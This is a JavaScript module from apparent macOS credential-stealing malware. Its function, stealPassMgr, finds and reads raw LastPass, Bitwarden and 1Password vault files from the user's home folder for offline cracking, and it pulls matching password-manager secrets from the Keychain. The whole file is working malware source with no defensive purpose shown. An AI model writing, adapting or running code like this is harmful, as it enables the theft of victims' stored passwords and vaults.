'use strict';
/*
 * Password managers: LastPass, Bitwarden, 1Password.
 *
 * These apps store encrypted vaults. We capture the vault files (raw, so they
 * can be attacked offline) plus any related Keychain items. On machines where a
 * manager is absent the section is empty. No native deps.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { keychainItems, keychainGet } = require('./keychain');

const HOME = os.homedir();

// Service/account names that indicate a password manager.
const PM_NAME_RE =
  /lastpass|bitwarden|1password|agilebits|password\s?bolix|keepass|dashlane|nordpass|proton\s?pass|bitwarden|password\s?manager/i;

const VAULT_LOCATIONS = [
  // LastPass (SQLCipher-encrypted vault.db)
  'Library/Application Support/LastPass/vault.db',
  'Library/Application Support/LastPass/lastpass.sqlite',
  // Bitwarden
  'Library/Application Support/Bitwarden/vault',
  'Library/Application Support/Bitwarden/vault.json',
  // 1Password (agilebits)
  'Library/Application Support/AgileBits/1Password',
  'Library/Group Containers/UABL7XGZRY.com.agilebits.onepassword-osx/Documents',
];

function readSmall(p, cap = 256 * 1024) {
  try {
    if (!fs.existsSync(p)) return null;
    const buf = fs.readFileSync(p);
    if (buf.length > cap) return { size: buf.length, head_hex: buf.slice(0, 64).toString('hex') };
    // Text vs binary heuristic.
    const sample = buf.slice(0, 512);
    let printable = 0;
    for (const b of sample) if (b >= 0x20 && b <= 0x7e) printable++;
    const isText = sample.length === 0 || printable / sample.length > 0.85;
    return isText ? buf.toString('utf8') : buf.toString('hex');
  } catch (e) {
    return null;
  }
}

function listDir(dir, cap = 256 * 1024) {
  const out = [];
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return out; }
  for (const ent of entries) {
    if (!ent.isFile()) continue;
    const p = path.join(dir, ent.name);
    const c = readSmall(p, cap);
    if (c !== null) out.push({ name: ent.name, content: c });
  }
  return out;
}

function stealPassMgr() {
  const result = { vaults: [], keychain_items: [] };
  for (const rel of VAULT_LOCATIONS) {
    const p = path.join(HOME, rel);
    if (fs.existsSync(p) && fs.statSync(p).isDirectory()) {
      const files = listDir(p);
      if (files.length) result.vaults.push({ dir: rel, files });
    } else if (fs.existsSync(p)) {
      const c = readSmall(p);
      if (c !== null) result.vaults.push({ path: rel, content: c });
    }
  }
  // Cross-reference the Keychain for password-manager items (service or account
  // name matches a known manager). Populates whenever a PM stores keychain items.
  for (const item of keychainItems()) {
    if (!item.service) continue;
    if (PM_NAME_RE.test(item.service) || (item.account && PM_NAME_RE.test(item.account))) {
      const value = keychainGet(item.service, item.account);
      result.keychain_items.push({
        service: item.service,
        account: item.account,
        value: value === null ? undefined : value,
        retrieved: value !== null,
      });
    }
  }
  return result;
}

module.exports = { stealPassMgr };
